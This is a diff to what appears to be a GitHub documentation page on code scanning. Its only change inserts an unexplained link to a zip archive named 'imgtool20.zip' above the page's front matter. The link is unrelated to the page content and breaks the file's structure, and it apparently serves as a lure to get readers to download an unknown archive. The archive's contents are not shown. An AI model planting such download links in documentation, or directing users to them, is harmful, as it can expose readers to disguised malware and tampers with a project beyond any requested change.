@@ -1,3 +1,4 @@
+[imgtool20.zip](https://github.com/github/docs/files/7892887/imgtool20.zip)
 ---
 title: About code scanning
 intro: 'You can use {% data variables.product.prodname_code_scanning %} to find security vulnerabilities and errors in the code for your project on {% data variables.product.prodname_dotcom %}.'
